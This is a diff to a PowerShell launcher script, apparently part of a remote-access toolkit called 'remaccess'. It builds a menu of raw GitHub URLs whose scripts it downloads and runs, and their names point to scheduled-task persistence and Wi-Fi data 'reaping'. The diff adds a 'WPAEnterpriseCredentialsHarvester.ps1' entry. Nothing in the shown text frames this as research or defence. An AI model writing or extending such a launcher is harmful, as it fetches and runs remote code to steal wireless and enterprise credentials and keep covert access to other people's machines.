@@ -38,9 +38,7 @@ function Show-ActionMenu {
         }
     }
 }
-
 [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
-# Define an array of action URLs
 $actions = @(
     "https://raw.githubusercontent.com/DirNotAvailable/remaccess/main/CleanUp.ps1",
     "https://raw.githubusercontent.com/DirNotAvailable/remaccess/main/AutomatedTaskWithPingInstall.ps1",
@@ -55,8 +53,8 @@ $actions = @(
     "https://raw.githubusercontent.com/DirNotAvailable/remaccess/main/WifiPersistentDataReaper.ps1",
     "https://raw.githubusercontent.com/DirNotAvailable/remaccess/main/TaskSchedulerServiceCreater.ps1",
     "https://raw.githubusercontent.com/DirNotAvailable/remaccess/main/PingTaskSchedulerCreator.ps1",
+    "https://raw.githubusercontent.com/DirNotAvailable/remaccess/main/WPAEnterpriseCredentialsHarvester.ps1",
     "https://raw.githubusercontent.com/DirNotAvailable/remaccess/main/Aria2InstallForRemoteSystems.ps1"
 )
-
 # Call the function to display the action menu and execute the selected action or quit
 Show-ActionMenu -Actions $actions
